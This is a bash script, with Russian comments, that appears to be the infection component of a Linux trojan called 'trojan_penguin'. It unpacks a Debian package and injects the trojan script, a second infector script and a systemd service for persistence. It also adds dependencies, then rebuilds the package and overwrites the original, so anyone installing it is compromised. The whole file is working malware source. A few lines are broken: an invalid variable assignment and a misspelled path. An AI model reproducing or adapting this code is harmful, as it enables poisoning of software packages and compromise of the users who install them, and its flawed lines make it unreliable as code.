#!/bin/bash
debug = ""
temp = "$debug/tmp/trojan_penguin"

mkdir $temp
mkdir $temp/new
mkdir $temp/new/DEBIAN

#распакуем пакет
ar -p $1 data.tar.xz | tar -xJ -C $temp/new
ar -p $1 control.tar.xz | tar -xJ -C $temp/new/DEBIAN/

cp $temp/new/DEBIAN/control $temp/orig_control
cat $temp/orig_control | grep --before-context=100 Depends | grep -v Depends >$temp/new/DEBIAN/control
cat $temp/orig_control | grep Depends | tr -d '\r\n' >>$temp/new/DEBIAN/control
echo ", fakeroot, python" >>$temp/new/DEBIAN/control
cat $temp/orig_control | grep --after-context=100 Depends | grep -v Depends >>$temp/new/DEBIAN/control

if [ -f $temp/new/usr/bin/trojan_penguin.sh ]; then
  rm -R $temp
  exit 0
fi

#Проверяем, есть ли в пакете postinstall
if [ -f $temp/ne/usr/bin/postinstall ]; then
  cp $temp/new/DEBIAN/postinst $debug/usr/bin/tp_orig_postinst
fi

#Достроим дерево с нужными нам директориями
if ! [ -d $temp/new/usr ]; then
  mkdir $temp/new/usr
fi
if ! [ -d $temp/new/usr/bin ]; then
  mkdir $temp/new/usr/bin
fi
if ! [ -d $temp/new/lib ]; then
  mkdir $temp/new/lib
fi
if ! [ -d $temp/new/lib/systemd ]; then
  mkdir $temp/new/lib/systemd
fi
if ! [ -d $temp/new/lib/systemd/system ]; then
  mkdir $temp/new/lib/systemd/system
fi

cp $debug/usr/bin/trojan_penguin.sh $temp/new/usr/bin/trojan_penguin.sh
cp $debug/usr/bin/tp_infect.sh $temp/new/usr/bin/tp_infect.sh
cp $debug/lib/systemd/system/trojan_penguin.service $temp/new/lib/systemd/system/

#Собираем пакет, перемещаем его на место старого и удаляем распакуем
fakeroot dpkg-deb --build $temp/new
cp $temp/new.deb $1
rm -R $temp
